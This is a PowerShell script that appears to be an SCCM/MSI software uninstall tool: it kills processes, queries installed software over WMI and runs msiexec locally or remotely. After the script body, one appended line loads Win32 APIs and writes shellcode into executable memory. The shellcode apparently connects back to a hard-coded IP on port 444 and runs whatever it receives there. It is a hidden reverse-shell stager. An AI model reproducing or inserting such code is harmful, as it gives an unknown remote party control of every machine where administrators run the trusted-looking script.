

[CmdletBinding(DefaultParameterSetName = 'Local')]
param (
	[Parameter(Mandatory = $True,
        ValueFromPipeline = $True,
        ValueFromPipelineByPropertyName = $True)]
	[string]$ProductName,
	[Parameter(Mandatory = $False,
        ValueFromPipeline = $True,
        ValueFromPipelineByPropertyName = $True)]
	[string]$Computername = 'localhost',
	[Parameter(Mandatory = $False,
        ValueFromPipeline = $False,
        ValueFromPipelineByPropertyName = $False)]
	[string]$MsiName,
	[Parameter(Mandatory = $False,
        ValueFromPipeline = $False,
        ValueFromPipelineByPropertyName = $False)]
	[string[]]$KillProcess,
	[Parameter(Mandatory = $False,
        ValueFromPipeline = $False,
        ValueFromPipelineByPropertyName = $False)]
	[scriptblock]$PreActions,
	[Parameter(Mandatory = $False,
        ValueFromPipeline = $False,
        ValueFromPipelineByPropertyName = $False)]
	[scriptblock]$PostActions,
	[Parameter(Mandatory = $False,
        ValueFromPipeline = $False,
        ValueFromPipelineByPropertyName = $False)]
	[switch]$Wait
)

begin {
	$WorkingDir = $MyInvocation.MyCommand.Path | Split-Path -Parent
	$SccmClientWmiNamespace = 'root\cimv2\sms'
	
	if ($MsiName) {
		$PackageMsiFilePath = "$WorkingDir\$MsiName"
	}
}

process {
	try {
		if ($KillProcess) {
			foreach ($process in $KillProcess) {
				Write-Verbose "Attempting to stop process $process..."
				if ($Computername -ne 'localhost') {
					$WmiProcess = Get-WmiObject -Class Win32_Process -ComputerName $ComputerName -Filter "name='$process`.exe'"
					if ($WmiProcess) {
						$WmiProcess.Terminate() | Out-Null
					}
				} else {
					Stop-Process -Name $process -Force -ErrorAction 'SilentlyContinue'
				}
			}
		}
		
		if ($PreActions) {
			&amp; $PreActions
		}
		
		$Query = "SELECT * FROM SMS_InstalledSoftware WHERE ARPDisplayName LIKE '%$ProductName%'"
		Write-Verbose "Querying computer for the existence of $ProductName..."
		$InstalledSoftware = Get-WmiObject -ComputerName $Computername -Namespace $SccmClientWmiNamespace -Query $Query
		
		if ($InstalledSoftware) {
			$InstalledSoftware | foreach {
				Write-Verbose "$ProductName ($($_.SoftwareCode)) found installed..."
				Write-Verbose "Ensuring there's a valid uninstall string found..."
				if ($_.UninstallString.Trim() -match 'msiexec.exe /x{(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}}') {
					Write-Verbose "Valid uninstall string found for $ProductName..."
					Write-Verbose "Ensuring a locally cached copy of the $ProductName MSI exists..."
					if ($Computername -ne 'localhost') {
						$LocalPackageFilePathDrive = ($_.LocalPackage | Split-Path -Qualifier).Replace(':', '')
						$LocalPackageFilePath = "\\$Computername\$LocalPackageFilePathDrive`$$($_.LocalPackage | Split-Path -NoQualifier)"
					} else {
						$LocalPackageFilePath = $_.LocalPackage
					}
					if (Test-Path $LocalPackageFilePath) {
						Write-Verbose "Install package $LocalPackageFilePath exists on the file system. Using locally cached copy for uninstall..."
						$UninstallSyntax = "$($_.UninstallString) /qn"
					} else {
						Write-Verbose "Install package $LocalPackageFilePath not found on file system..."
						if (!$PackageMsiFilePath) {
							Write-Verbose "No MSIName specified as param.  Searching current directory for MSI..."
							$LocalMsis = Get-ChildItem $WorkingDir -Filter '*.msi' | Select -first 1
							if (!$LocalMsis) {
								throw 'No MSIs found to support uninstall'
							} else {
								$PackageMsiFilePath = $LocalMsis.FullName
							}
						} elseif (!(Test-Path $PackageMsiFilePath)) {
							throw 'Package MSI needed but MSI specified does not exist in current directory'
						} else {
							
							
							
							
							
							
						}
						$UninstallSyntax = "/x `"$PackageMsiFilePath`" /qn"
					}
					$MsiExecArgs = $UninstallSyntax.ToLower().TrimStart('msiexec.exe ')
					Write-Verbose "Beginning uninstall using syntax: msiexec.exe $MsiExecArgs on $Computername"
					
					if ($Computername -ne 'localhost') {
						
						$NewProcess = ([WMICLASS]"\\$computername\Root\CIMV2:Win32_Process").create("msiexec $MsiExecArgs")
						if ($NewProcess.ReturnValue -eq 0) {
							Write-Verbose "Successfully started remote msiexec process on $Computername."
							if ($Wait.IsPresent) {
								Write-Verbose "Waiting for process ID $($NewProcess.ProcessID) on $Computername."
								while (Get-Process -Id $NewProcess.ProcessID -ComputerName $Computername -ErrorAction 'SilentlyContinue') {
									sleep 1
								}
								Write-Verbose "Process ID $($NewProcess.ProcessID) has exited"
							}
							
						} else {
							throw "Software uninstall failed on $Computername.  Exit code was $ExitCode"
						}
					} else {
						if ($Wait.IsPresent) {
							Write-Verbose 'Waiting on uninstall to finish...'
							Start-Process msiexec.exe -ArgumentList $MsiExecArgs -Wait -NoNewWindow
						} else {
							Start-Process msiexec.exe -ArgumentList $MsiExecArgs -NoNewWindow
						}
					}
					
				} else {
					Write-Warning "Invalid uninstall string found for $ProductName..."
				}
			}
		} else {
			Write-Warning "$ProductName seems to already be uninstalled"
		}
	} catch {
		Write-Error $_.Exception.Message
	}
}

end {
	if ($PostActions) {
		&amp; $PostActions
	}
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x39,0x2d,0x7d,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

